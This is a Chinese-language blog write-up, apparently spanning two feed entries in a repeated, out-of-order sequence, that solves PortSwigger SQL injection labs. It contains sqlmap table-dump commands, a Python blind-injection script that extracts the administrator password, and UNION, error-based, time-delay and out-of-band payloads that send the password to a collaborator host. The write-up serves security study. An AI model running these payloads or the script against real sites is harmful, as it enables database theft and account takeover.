<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.首先进行sql漏洞扫描</span><br><span class="line">sqlmap -u url --cookie <span class="string">&quot;TrackingId=xxx&quot;</span></span><br><span class="line">2.然后获得当前使用的数据库名称</span><br><span class="line">sqlmap -u url --current-db</span><br><span class="line">3.获得所有表</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> --tables</span><br><span class="line">4.获得<span class="built_in">users</span>表字段</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> -T <span class="string">&quot;users&quot;</span> --dump</span><br><span class="line">5.获得<span class="built_in">users</span>表中的用户名</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> -T <span class="string">&quot;users&quot;</span> -C <span class="string">&quot;username&quot;</span> --dump</span><br></pre></td></tr></table></figure>
<p>在获得某用户密码的时候，本题只需要我们获得<code>administrator</code>的密码就可以了，考虑到密码又多又长，逐个爆破会消耗大量的时间，因此我编写了Python脚本单独对<code>administrator</code>用户进行爆破，脚本已经很自动化了，只需要把url和TrackingId换成子自己的就可以了。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求的URL</span></span><br><span class="line">url = <span class="string">&quot;https://0a00000a04a6557481de208a005400a1.web-security-academy.net/filter?category=Pets&quot;</span></span><br><span class="line">username = <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">tablename = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">method = <span class="string">&#x27;get&#x27;</span></span><br><span class="line">sleep_time = <span class="number">0</span></span><br><span class="line">TrackingId = <span class="string">&#x27;brVO8ubeFsIHT9hw&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie获取密码长度get_password_length_by_user</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_length_by_user</span>(<span class="params">url,username,tablename,intject_id</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;intject_id&#125;</span>&#x27; and (select &#x27;a&#x27; from users where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND LENGTH(password)&gt;<span class="subst">&#123;i&#125;</span>)=&#x27;a&#x27; --+&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">        sleep(sleep_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password_length=i</span><br><span class="line">            <span class="keyword">return</span> password_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破某一用户名密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_by_user</span>(<span class="params">url,username,tablename,inject_id</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    password_length=get_password_length_by_user(url,username,tablename,inject_id)</span><br><span class="line">    <span class="keyword">for</span> password_index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length+<span class="number">1</span>):</span><br><span class="line">        ascii_low = <span class="number">32</span></span><br><span class="line">        ascii_high = <span class="number">128</span></span><br><span class="line">        ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> ascii_low &lt; ascii_high:</span><br><span class="line">            cookies = &#123;</span><br><span class="line">                <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;inject_id&#125;</span>&#x27; and ascii(substr((select password from <span class="subst">&#123;tablename&#125;</span> where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27;),<span class="subst">&#123;password_index&#125;</span>,1)) &gt; <span class="subst">&#123;ascii_mid&#125;</span>--+;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">            sleep(sleep_time)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                ascii_low=ascii_mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ascii_high = ascii_mid</span><br><span class="line">            ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        result+=<span class="built_in">chr</span>(ascii_mid)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">password=get_password_by_user( url,username,tablename,TrackingId)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
<p><font class="notice">其实，本题在爆破数据表时，也可以使用Python单独对表名中含有<code>user</code>的表进行爆破，但考虑实际情况，把所有的表名爆破出，容易获得更多的信息</font></p>
<h2 id="带有条件错误的盲-SQL-注入">带有条件错误的盲 SQL 注入</h2>
<p>Substring用法：你可以从指定偏移量开始，提取具有指定长度的字符串部分。需要注意的是，偏移量索引是从1开始计数的。以下每个表达式都将返回字符串 <code>ba</code>。</p>
<table>
<thead>
<tr>
<th style="text-align:left">数据库</th>
<th style="text-align:left">语法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left"><code>SUBSTR('foobar', 4, 2)</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
</tbody>
</table>
<p>跟上一题是非常类似的。讲一下原理</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、添加单引号收到错误</span><br><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加两个单引号错误消失</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;&#x27;</span></span><br><span class="line"><span class="string">3、确认是查询错误而不是其他类型错误。下列语句表明目标为Oracle 数据库</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;（错误）</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> dual)<span class="operator">||</span><span class="string">&#x27;（正确）</span></span><br><span class="line"><span class="string">4、验证users表存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">5、验证用户administrator存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">6、爆破密码长度</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> LENGTH(password)<span class="operator">&gt;</span>§a§ <span class="keyword">THEN</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">7、爆破密码</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> SUBSTR(password,§b§,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;§a§&#x27;</span> <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><img src="/posts/3b7c6011//image-20250316173050195.png" alt="image-20250316173050195"></p>
<h2 id="基于可见错误的-SQL-注入-bool型SQL注入">基于可见错误的 SQL 注入(bool型SQL注入)</h2>
<p>错误会返回到客户端</p>
<p><img src="/posts/3b7c6011//image-20250316181656140.png" alt="image-20250316181656140"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、天加一个引号，可以在web页面看到报错，并看到自己的cookie</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加注释符不再报错</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">3</span>、添加错误的语句观察返回内容</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27; AND CAST((SELECT 1) AS int)--</span></span><br><span class="line"><span class="string">4、使用正确语句错误消失</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br><span class="line"><span class="number">5</span>、泄露用户</span><br><span class="line">TrackingId<span class="operator">=</span>xxxx<span class="string">&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</span></span><br><span class="line"><span class="string">6、泄露密码</span></span><br><span class="line"><span class="string">TrackingId=&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>我试了下面这个注入语句，但是没有得到想要的结果。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="string">&#x27; AND 1=CAST((SELECT password FROM users where username=&#x27;</span>administrator<span class="string">&#x27;) AS int)--</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250316184013533.png" alt="image-20250316184013533"></p>
<h2 id="带有时间延迟和信息检索的盲-SQL-注入">带有时间延迟和信息检索的盲 SQL 注入</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>延迟<span class="number">10</span>秒</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></span><br><span class="line"><span class="string">2.不延时</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="comment">--</span></span><br><span class="line"><span class="number">3.</span>延时，说明有administrator用户</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br><span class="line"><span class="string">4.延时，说明密码长度为20</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span><span class="operator">+</span><span class="keyword">AND</span><span class="operator">+</span>LENGTH(password)<span class="operator">=</span><span class="number">20</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--</span></span><br><span class="line"><span class="number">5.</span>bp爆破</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;+AND+SUBSTRING(password,§b§,1)=&#x27;</span>§a§<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br></pre></td></tr></table></figure>
<h2 id="带外交互的盲-SQL-注入">带外交互的盲 SQL 注入</h2>
<p><img src="/posts/3b7c6011//image-20250320124609391.png" alt="image-20250320124609391"></p>
<p><a href="http://k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com">k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: TrackingId<span class="operator">=</span>Mf3GZbtHdrUPYCyR<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--; session=7HQmzle2kv8m9yAyiZADwZ8B64e6hGQp</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250320124746996.png" alt="image-20250320124746996"></p>
<h2 id="SQL盲注与带外数据渗出">SQL盲注与带外数据渗出</h2>
<p>跟上边类似的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250320142450030.png" alt="image-20250320142450030"></p>
<h2 id="通过-XML-编码绕过过滤器的-SQL-注入XML绕过注入">通过 XML 编码绕过过滤器的 SQL 注入XML绕过注入</h2>
<p><img src="/posts/3b7c6011//image-20250320153828228.png" alt="image-20250320153828228"></p>
<p><img src="/posts/3b7c6011//image-20250320153954704.png" alt="image-20250320153954704"></p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>PortSwigger靶场</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger学院】SQL 注入</title>
    <url>/posts/3b7c6011/</url>
    <content><![CDATA[<h2 id="SQL注入漏洞语句允许检索隐藏数据的位置">SQL注入漏洞语句允许检索隐藏数据的位置</h2>
<p>这个是查看隐藏数据的漏洞，比较简单。通过BurpSuite直接拦截修改就行。</p>
<p><img src="/posts/3b7c6011//image-20250305143611182.png" alt="image-20250305143611182"></p>
<p>之所以能隐藏信息是因为后端的查询语句是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>因此通过我们的修改注释掉了<code>AND released = 1</code></p>
<p><strong>思考</strong>：</p>
<p>首先对后端查询语句要有一定敏感程度，另外如果AND后的语句在前是否就避免了这个漏洞呢？</p>
<span id="more"></span>
<h2 id="SQL注入漏洞允许登录绕过">SQL注入漏洞允许登录绕过</h2>
<p>这个也非常简单，注释掉password就可以登录任意用户了。</p>
<p><img src="/posts/3b7c6011//image-20250305144942049.png" alt="image-20250305144942049"></p>
<p><strong>思考</strong>：</p>
<p>对之前挖的几个平台做了一下尝试，没出意外都失败了。果然这么简单的洞不太好遇见。</p>
<h2 id="SQL注入UNION攻击，确定查询返回的列数">SQL注入UNION攻击，确定查询返回的列数</h2>
<p>这个使用<code>?category=Accessones' order by 3--</code>时不报错，使用<code>?category=Accessones' order by 4--</code>时报错，说明返回列有三个。但是不能直接过关，需要使用<code>'?category=Accessones'UNION SELECT NULL,NULL,NULL--</code>过关</p>
<p><img src="/posts/3b7c6011//image-20250305153505747.png" alt="image-20250305153505747"></p>
<p>我们可以看到，虽然执行<code>order by 4</code>的时候报错，但是报错代码为500说明还是执行了的。在portswigger中提到：</p>
<blockquote>
<p>​            As with the <code>ORDER BY</code> technique, the application might actually return the database error in its HTTP response, but may  return a generic error or simply return no results. When the number of  nulls matches the number of columns, the database returns an additional  row in the result set, containing null values in each column. The effect on the HTTP response depends on the application’s code. If you are  lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a <code>NullPointerException</code>. In the  worst case, the response might look the same as a response caused by an  incorrect number of nulls. This would make this method ineffective.</p>
</blockquote>
<p>因此报错语句可以作为是否存在UNION漏洞的参考</p>
<p>在 Oracle 中，每个 SELECT 查询都必须使用 FROM 关键字，并指定一个有效的表。Oracle 上有一个名为 dual 的内置表，可用于此目的。因此，在 Oracle 上注入的查询必须如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure>
<p>MySQL 中，<code>--</code>后必须跟一个空格。</p>
<p>有关数据库特定语法的更多详情，请参阅 <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
<h2 id="SQL注入UNION攻击，找到包含文本的列">SQL注入UNION攻击，找到包含文本的列</h2>
<p>让找哪个列支持查找字符串，找出一共多少列以后，挨个试试就可以了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+&#x27;</span>abcdef<span class="string">&#x27;,NULL,NULL--</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">?category=Accessories%&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="string">&#x27;Y5LIpq&#x27;</span>,<span class="keyword">null</span><span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; and 1=2 union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL初入UNION攻击，从其他表中检索数据">SQL初入UNION攻击，从其他表中检索数据</h2>
<p>让检索出管理员账号密码，然后登陆管理员的账号。这道题的重点是当遇到两个能检索出字符串的列时，如何利用。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL注入UNION攻击，在单列中检索多个值">SQL注入UNION攻击，在单列中检索多个值</h2>
<p>当只有一个string列可以被检索时，需要将两个列的内容连接到一个列。</p>
<ol>
<li class="lvl-3">
<p>首先通过之前的办法看看有几个可以检索的列</p>
</li>
<li class="lvl-3">
<p>然后检测哪一个列可以检索字符串</p>
</li>
<li class="lvl-3">
<p>最后合并检索用户名和密码</p>
</li>
</ol>
<p>通过检测，可以检索的列有两个，第二个可以检索字符串。将用户名和密码合并到第二列中即可，注入代码：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,username||&#x27;</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="string">&#x27;||password+from+users--</span></span><br></pre></td></tr></table></figure>
<p>不同的数据库使用不同的语法来执行字符串连接。有关详细信息，请参阅<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
<p>| Oracle     | <code>                   'foo'||'bar'               </code> |<br>
| ---------- | -------------------------------------------------- |<br>
| Microsoft  | <code>                   'foo'+'bar'               </code>  |<br>
| PostgreSQL | <code>                   'foo'||'bar'               </code> |<br>
| MySQL      | CONCAT(‘foo’,‘bar’)                                |</p>
<p>然而在实际情况下，我们并不能像题目所给出的那样直接获得表名和列名。因此，现实中，我们需要首先获得数据库的表名和列名，才能对其进行查询。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,table_name from information_schema.tables--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">列：username,password</span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">数据:administrator<span class="operator">=</span><span class="operator">=</span><span class="operator">=</span>lcv555mv2prf2m81w40v</span><br><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,concat(username,&#x27;</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="string">&#x27;,password) from users--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">利用administrator登录</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL-注入攻击，查询-MySQL-和-Microsoft-的数据库类型和版本">SQL 注入攻击，查询 MySQL 和 Microsoft 的数据库类型和版本</h2>
<p>获得数据库的版本号，比较简单。各个数据库查询数据库版本的语句如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">Database type</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td style="text-align:left">Oracle</td>
<td><code>SELECT * FROM v$version</code><br><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
</tbody>
</table>
<p>查询SQL版本的语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,@@version-- +</span></span><br></pre></td></tr></table></figure>
<p>思考：</p>
<p>发现了一个问题，在执行SQL注入时，使用<code>--</code>进行注释时需要在其后添加一个空格，即<code>-- +</code>。然而刚开始并没有加但是还是过了，因此需要注意。另外这一题是可以使用<code>#</code>来注释的，但是前面的却不行，原因目前还不明白。</p>
<h2 id="SQL-注入攻击，列出非-Oracle-数据库的数据库内容">SQL 注入攻击，列出非 Oracle 数据库的数据库内容</h2>
<p>这一题题目没有给表单和列名，更切合实际情况，实际上跟上面的是一致的。不再过多叙述。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union select &#x27;</span>a<span class="string">&#x27;,null-- =</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables<span class="comment">-- =</span></span><br><span class="line"><span class="string">&#x27;union select column_name,null from information_schema.columns where table_name=&#x27;</span>users_vorbge<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> username_ucmiyr<span class="operator">||</span><span class="string">&#x27;~~~&#x27;</span><span class="operator">||</span>password_unmsjv,<span class="keyword">null</span> <span class="keyword">from</span> users_vorbge<span class="comment">-- =</span></span><br></pre></td></tr></table></figure>
<h2 id="利用条件响应进行盲目-SQL-注入">利用条件响应进行盲目 SQL 注入</h2>
<p>在开始这道题之前呢，有必要了解一下，要解决这道题是有三个必要条件的：</p>
<ol>
<li class="lvl-3">
<p><strong>正确和错误的cookie的返回包存在差异</strong></p>
</li>
</ol>
<p>起初我是很困惑我要多么小心翼翼才能发现<code>Welcome back!</code>这一句话的小小差异。然后我就恍然大悟了，我们直接对比response包的大小，如果不一样再找出哪儿不一样就可以了。</p>
<ol start="2">
<li class="lvl-3">
<p><strong>cookie允许盲注</strong></p>
</li>
</ol>
<p>即在cookie后添加<code>'AND '1'='1</code>和添加<code>'AND '1'='2</code>返回的结果是不同的</p>
<ol start="3">
<li class="lvl-3">
<p><strong>我们要查询的表名和列名</strong></p>
</li>
</ol>
<p>虽然题目直接给了我们表名和列名，当我们都知道，实际情况中并不会有公司摆着洞给我们挖。因此有没有办法通过盲注获得我们需要的表名和列名呢？那当然是有的。</p>
<p>我们要知道，盲注语句是否执行成功我们是可以知道的。那么，是否存在一个表单或者列名，我们也是可以了解的。因此，我们依然可以通过盲注的方式获得表名和列名。</p>
<p>所以是可以使用Python写脚本爆破的，当然也可以用sqlmap工具，非常简便。</p>
<p><font class="notice">我打算再写一篇sqlmap的用法总结，先这里插个眼</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.首先进行sql漏洞扫描</span><br><span class="line">sqlmap -u url --cookie <span class="string">&quot;TrackingId=xxx&quot;</span></span><br><span class="line">2.然后获得当前使用的数据库名称</span><br><span class="line">sqlmap -u url --current-db</span><br><span class="line">3.获得所有表</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> --tables</span><br><span class="line">4.获得<span class="built_in">users</span>表字段</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> -T <span class="string">&quot;users&quot;</span> --dump</span><br><span class="line">5.获得<span class="built_in">users</span>表中的用户名</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> -T <span class="string">&quot;users&quot;</span> -C <span class="string">&quot;username&quot;</span> --dump</span><br></pre></td></tr></table></figure>
